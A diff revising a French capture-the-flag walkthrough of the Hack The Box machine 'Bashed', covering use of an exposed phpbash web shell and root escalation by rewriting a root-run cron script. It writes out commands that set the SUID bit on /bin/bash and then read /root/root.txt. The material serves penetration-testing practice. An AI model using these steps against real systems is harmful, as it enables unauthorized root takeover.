@@ -497,15 +497,13 @@ Le texte de la page indique que cet outil permet d’obtenir un shell semi-inter
 
 Ce détail est important : sur cette machine, l’objectif initial n’est pas d’exploiter une application complexe, mais d’identifier où l’outil phpbash a été laissé accessible sur le serveur web.
 
-{{< figure src="index-dev.png" alt="Index du répertoire /dev/ montrant le fichier phpbash.php" class="img-left-60" >}}
-
-
-
 La découverte du répertoire `/dev/` permet ensuite d’accéder au fichier suivant :
 
 ```url
 http://bashed.htb/dev/phpbash.php
 ```
+
+{{< figure src="index-dev.png" alt="Index du répertoire /dev/ montrant le fichier phpbash.php" class="img-left-60" >}}
 
 En ouvrant cette page dans le navigateur, tu obtiens une console web exécutée côté serveur.
 
@@ -564,6 +562,11 @@ Tu explores d’abord le répertoire de `arrexel`, car c’est le compte utilisa
 
 ```bash
 ls -la /home/arrexel
+```
+
+Résultat :
+
+```bash
 total 32
 drwxr-xr-x 4 arrexel arrexel 4096 Jun 2 2022 .
 drwxr-xr-x 4 root root 4096 Dec 4 2017 ..
@@ -623,8 +626,6 @@ Cette énumération marque le début de l’escalade de privilèges.
 
 ## Escalade de privilèges
 
-## Escalade de privilèges
-
 ### Énumération avec les droits de scriptmanager
 
 Tu refais maintenant une énumération locale avec l’identité de `scriptmanager`.
@@ -674,7 +675,7 @@ total 16
 drwxr-xr-x  2 scriptmanager scriptmanager 4096 Dec 4 2017 .
 drwxr-xr-x 23 root          root          4096 Jun 2 2022 ..
 -rw-r--r--  1 scriptmanager scriptmanager   58 Dec 4 2017 test.py
--rw-r--r--  1 root          root            12 Jun 15 01:20 test.txt
+-rw-r--r--  1 root          root            [date] 01:20 test.txt
 ```
 
 Le fichier `test.py` appartient à `scriptmanager`. Grâce au droit `sudo` obtenu depuis `www-data`, tu peux donc lire et modifier ce fichier.
@@ -698,7 +699,7 @@ Il écrit une chaîne de caractères dans le fichier `test.txt`.
 Or, dans `/scripts`, le fichier `test.txt` appartient à `root` :
 
 ```text
--rw-r--r--  1 root root 12 Jun 15 01:20 test.txt
+-rw-r--r--  1 root root [date] 01:20 test.txt
 ```
 
 C’est un indice fort : le script est probablement exécuté par `root`, ou au moins dans un contexte privilégié.
@@ -721,58 +722,86 @@ L’horodatage change, tandis que le propriétaire reste `root`.
 
 Le script `test.py` est donc exécuté régulièrement dans un contexte privilégié. Comme il appartient à `scriptmanager`, tu peux le modifier et profiter de cette exécution automatique pour élever tes privilèges.
 
-- ### Modification de test.py
+### Preuve d’exécution avec les droits root
 
-  L’objectif est d’obtenir un moyen simple d’exécuter une commande avec les privilèges root.
+Avant de modifier le script pour obtenir l’escalade, tu peux faire une preuve simple et non destructive.
 
-  Une méthode efficace consiste à faire poser le bit SUID sur `/bin/bash`. Dans phpbash, le signe `+` peut poser problème dans certaines commandes. Pour éviter cette difficulté, tu utilises directement la notation numérique des permissions avec `chmod 4755`.
+L’idée est de remplacer temporairement `test.py` par une commande qui écrit le résultat de `id` dans `/tmp/test_poc.txt`.
 
-  Tu remplaces donc le contenu de `/scripts/test.py` avec les droits de `scriptmanager` :
+Tu modifies le script avec les droits de `scriptmanager` :
 
-  ```bash
-  sudo -u scriptmanager bash -c 'cat > /scripts/test.py << "EOF"
-  import os
-  os.system("chmod 4755 /bin/bash")
-  EOF'
-  ```
+```bash
+sudo -u scriptmanager bash -c 'printf "import os\nos.system(\"id > /tmp/test_poc.txt\")\n" > /scripts/test.py'
+```
 
-  Cette commande ne donne pas root immédiatement. Elle modifie seulement le fichier `test.py`, qui appartient à `scriptmanager`.
+Après environ une minute, tu vérifies le fichier créé dans `/tmp` :
 
-  L’élévation se produit lorsque ce script est exécuté à nouveau dans son contexte privilégié.
+```bash
+ls -l /tmp/test_poc.txt
+cat /tmp/test_poc.txt
+```
 
-  Tu vérifies ensuite les permissions de `/bin/bash` :
+Le fichier appartient à `root` et son contenu confirme l’exécution avec les droits root :
 
-  ```bash
-  ls -l /bin/bash
-  ```
+```bash
+-rw-r--r-- 1 root root 39 [date] 01:24 /tmp/test_poc.txt
 
-  Lorsque le bit SUID est en place, les permissions contiennent un `s` sur la partie utilisateur :
+uid=0(root) gid=0(root) groups=0(root)
+```
 
-  ```text
-  -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash
-  ```
+Cette preuve confirme le point important : `scriptmanager` peut modifier `test.py` et le script est exécuté par `root`.
 
-  Le `s` dans `rws` indique que `/bin/bash` s’exécutera avec les privilèges effectifs de son propriétaire, ici `root`.
+Tu peux maintenant remplacer cette preuve de concept par la commande utile à l’escalade.
 
-  ### Lecture du flag root
+### Exploitation avec un Bash SUID
 
-  Dans un terminal classique, `/bin/bash -p` permettrait d’obtenir un shell avec les privilèges effectifs de root.
+L’objectif est d’obtenir un moyen simple d’exécuter une commande avec les privilèges root.
 
-  Ici, l’exécution se fait depuis phpbash. Pour éviter les limites de ce shell web, tu lances directement les commandes nécessaires avec l’option `-c` :
+Une méthode efficace consiste à faire poser le bit SUID sur `/bin/bash`. Dans phpbash, le signe `+` peut poser problème dans certaines commandes. Pour éviter cette difficulté, tu utilises directement la notation numérique des permissions avec `chmod 4755`.
 
-  ```bash
-  /bin/bash -p -c 'id; whoami; cat /root/root.txt'
-  ```
+Tu remplaces donc le contenu de `/scripts/test.py` avec les droits de `scriptmanager` :
 
-  La sortie confirme que l’utilisateur effectif est `root` :
+```bash
+sudo -u scriptmanager bash -c 'printf "import os\nos.system(\"chmod 4755 /bin/bash\")\n" > /scripts/test.py'
+```
 
-  ```text
-  uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
-  root
-  c27bxxxxxxxxxxxxxxxxxxxxxxxx9225
-  ```
+Cette commande ne donne pas root immédiatement. Elle modifie seulement le fichier `test.py`, qui appartient à `scriptmanager`.
 
-  L’accès root est confirmé et le flag final est récupéré : la machine est terminée.
+L’élévation se produit lorsque ce script est exécuté à nouveau dans son contexte privilégié.
+
+Tu vérifies ensuite les permissions de `/bin/bash` :
+
+```bash
+ls -l /bin/bash
+```
+
+Lorsque le bit SUID est en place, les permissions contiennent un `s` sur la partie utilisateur :
+
+```bash
+-rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash
+```
+
+Le `s` dans `rws` indique que `/bin/bash` s’exécutera avec les privilèges effectifs de son propriétaire, ici `root`.
+
+### root.txt
+
+Dans un terminal classique, `/bin/bash -p` permettrait d’obtenir un shell avec les privilèges effectifs de root.
+
+Ici, l’exécution se fait depuis phpbash. Pour éviter les limites de ce shell web, tu lances directement les commandes nécessaires avec l’option `-c` :
+
+```bash
+/bin/bash -p -c 'id; whoami; cat /root/root.txt'
+```
+
+La sortie confirme que l’utilisateur effectif est `root` :
+
+```text
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+root
+c27bxxxxxxxxxxxxxxxxxxxxxxxx9225
+```
+
+L’accès root est confirmé et le flag final est récupéré : la machine est terminée.
 
 
 
